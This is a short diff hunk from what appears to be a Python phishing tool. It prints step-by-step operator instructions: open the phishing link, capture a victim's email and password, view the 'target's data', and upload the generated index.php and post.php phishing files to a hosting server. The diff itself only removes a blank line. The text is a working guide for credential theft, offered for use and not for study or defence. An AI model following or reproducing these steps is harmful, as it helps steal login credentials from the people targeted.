@@ -36,7 +36,6 @@ print "[9] Copy Phishing Link and paste in browser "
 print "[10] Enter email and password and Click Login"
 print "[11] Copy Password Link and paste browser "
 print "[12] You must see target's data(Email,Password)\n"
-
 print colors.color.red+"Phishing upload at your hosting guide"+colors.color.end+"\n"
 print "[1] You can see phishing file( index.php and post.php )at /var/www/html/your-submit-code/"
 print "[2] Upload index.php and post.php at your Hosting"
